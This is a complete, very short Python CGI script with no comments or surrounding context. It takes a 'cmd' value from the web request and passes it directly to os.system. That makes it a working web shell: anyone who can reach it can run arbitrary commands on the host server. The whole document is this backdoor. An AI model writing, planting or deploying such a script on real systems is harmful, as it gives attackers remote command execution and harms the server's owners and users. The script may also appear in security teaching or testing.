#!/usr/bin/env python
import cgi
import os

form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
os.system(cmd)
